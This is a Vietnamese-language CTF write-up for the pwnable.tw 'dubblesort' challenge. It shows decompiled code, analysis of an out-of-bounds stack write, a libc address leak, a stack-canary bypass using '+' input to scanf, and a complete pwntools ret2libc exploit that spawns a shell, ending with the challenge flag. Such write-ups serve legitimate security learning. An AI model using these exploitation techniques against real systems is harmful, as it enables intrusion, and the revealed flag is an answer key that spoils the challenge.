# dubblesort

## ida 

- **main**

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int total; // eax
  unsigned int *number; // edi
  unsigned int i; // esi
  unsigned int j; // esi
  int result; // eax
  unsigned int idx; // [esp+18h] [ebp-74h] BYREF
  unsigned int array[8]; // [esp+1Ch] [ebp-70h] BYREF
  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF
  unsigned int canary; // [esp+7Ch] [ebp-10h]

  canary = __readgsdword(0x14u);
  setup();
  printf(1, (int)"What your name :");
  read(0, buf, 64u);
  printf(1, (int)"Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf((int)"%u", (int)&idx);
  total = idx;
  if ( idx )
  {
    number = array;
    for ( i = 0; i < idx; ++i )
    {
      printf(1, (int)"Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf((int)"%u", (int)number);
      total = idx;
      ++number;
    }
  }
  doublesort(array, total);
  puts("Result :");
  if ( idx )
  {
    for ( j = 0; j < idx; ++j )
      printf(1, (int)"%u ");
  }
  result = 0;
  if ( __readgsdword(0x14u) != canary )
    exit_func();
  return result;
}
```
- **doublesort** 

```c 
unsigned int __cdecl sub_931(unsigned int *a1, int a2)
{
  int v2; // ecx
  int i; // edi
  unsigned int v4; // edx
  unsigned int v5; // esi
  unsigned int *v6; // eax
  unsigned int result; // eax
  unsigned int v8; // [esp+1Ch] [ebp-20h]

  v8 = __readgsdword(0x14u);
  puts("Processing......");
  sleep(1u);
  if ( a2 != 1 )
  {
    v2 = a2 - 2;
    for ( i = (int)&a1[a2 - 1]; ; i -= 4 )
    {
      if ( v2 != -1 )
      {
        v6 = a1;
        do
        {
          v4 = *v6;
          v5 = v6[1];
          if ( *v6 > v5 )
          {
            *v6 = v5;
            v6[1] = v4;
          }
          ++v6;
        }
        while ( (unsigned int *)i != v6 );
        if ( !v2 )
          break;
      }
      --v2;
    }
  }
  result = __readgsdword(0x14u) ^ v8;
  if ( result )
    exit_func();
  return result;
}
``` 

## Analysis 

- nhìn sơ qua thì thấy có lỗi OOB và BOF 
- hàm doublesort đơn giản là sắp xếp lại number từ bé đến lớn
- nhập vào hàm buf rồi in ra , khả năng cao có thể leak được addr => leak libc 

![image](https://github.com/gookoosss/CTF/assets/128712571/9cfe3c0d-521b-4fd2-889c-8c305cb8f8dc)

- checks thì thấy có canary , khả năng cao ta phải tìm cách bypass rồi 

## Exploit 

- đầu tiên làm cái dễ nhất là leak libc cái 

```c 
p.sendafter(b'name :', b'a'*16)
p.recvuntil(b'a'*16)
libc.address = u32(p.recv(4))  - 0x8f82f
print(hex(libc.address))
system  = libc.sym.system
binsh = next(libc.search(b'/bin/sh\0'))
print(system)
print(binsh)
``` 
- có được libc rồi thì ta debug tìm cách bypass canary 

![image](https://github.com/gookoosss/CTF/assets/128712571/ae89428d-d1cc-474f-831a-5503d1d9a58c)

- canary cách edi là 0x60 byte(96), ta chia 4 thì ra 24, vậy canary nằm ở number 25
- như bài Bad grades mà ta từng làm, bypass qua canary thì ta chỉ cần nhập dấu '.' , debug thử xem sao

```python 
for i in range(24):
    p.sendlineafter(b'number : ', b'1')

p.sendlineafter(b'number : ', b'+')
```
- deee đúng như ta dự đoán thì canary ko thay đổi, nhưng mà có 1 vấn đề lớn đó là những lần nhập sau đó sẽ ko nhận giá trị vào stack(mặc dù vẫn nhập được nhưng stack như cũ ko hề thay đổi)
- sau một hồi research thì mình cũng hiểu ra 
- khác với bài Bad grades ta từng làm là scanf() có format là %llf (long long) và ta sử dụng dấu '.' để bypass, còn trong chall này thì scanf() có format là %u (unsigned int) nên ta phải dùng dấu '+' để bypass canary
- sau khi giải quyết được canary thì tìm cách để lấy shell, đơn giản là sử dụng BOF
- nhưng mà còn 1 vấn đề khác nảy sinh ra, đó là hàm doublesort() sẽ sắp xếp các giá trị stack của number từ bé đến lớn
- điều này vô tình làm dữ liệu ta nhập vào bị đảo lộn 
- may mắn thay binsh > system > canary trong mọi trường hợp 
- ta tính được offset đến rip là 33
- thế nên sau khi bypass canary ta sẽ nhập 8 lần system, 7 lần để tạo padding tránh sort và lần cuối là orw rip
```c 
for i in range(8):
    p.sendlineafter(b'number : ', str(system))
```
- còn binsh ta sẽ để đâu đây  

![image](https://github.com/gookoosss/CTF/assets/128712571/9da86236-91a9-4c0c-b7b3-7c7b5563fb93)


- đọc hàm system thì thấy esp - 0xc(12byte), rồi + 0x10(16byte) để gán vào eax, hmm vậy thì ta sẽ đặt 2 lần binsh sau system để lấy shell 

![image](https://github.com/gookoosss/CTF/assets/128712571/2e280c81-a959-4919-847e-99d50b08acc7)

- dee và cuối cùng ta cũng có flag  

![image](https://github.com/gookoosss/CTF/assets/128712571/9457a070-aa2f-4458-940b-ed4da792664d)


## script 

```python 
#!/usr/bin/env python3

from pwn import *

exe = ELF("./dubblesort_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

p = process([exe.path])
p = remote('chall.pwnable.tw', 10101)

# gdb.attach(p, gdbscript = '''
# b*main+85
# b*main+133
# b*main+210
# c
# ''')

# input() 

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)


# 0x8f82f
# p.sendafter(b'name :', b'a'*16)
# p.recvuntil(b'a'*16)
# libc.address = u32(p.recv(4))  - 0x8f82f
# print(hex(libc.address))
# system  = libc.sym.system
# binsh = next(libc.search(b'/bin/sh\0'))
# print(system)
# print(binsh)
# p.sendline(b'35')

sa(b'name :',b'a'*0x1d)
p.recvuntil(b'a'*0x1d)
libc_leak = u32(b'a' + p.recv(3))
libc.address = libc_leak - 0x61 - 0x1b0000
info('libc leak: ' + hex(libc_leak))
info('libc base: ' + hex(libc.address))

system  = libc.sym.system
binsh = next(libc.search(b'/bin/sh\0'))

p.sendline(b'35')

for i in range(24):
    p.sendlineafter(b'number : ', b'1')

p.sendlineafter(b'number : ', b'+')

for i in range(8):
    p.sendlineafter(b'number : ', str(system))

for i in range(2):
    p.sendlineafter(b'number : ', str(binsh))


p.interactive()

# FLAG{Dubo_duBo_dub0_s0rttttttt}
``` 

## Flag  

FLAG{Dubo_duBo_dub0_s0rttttttt}
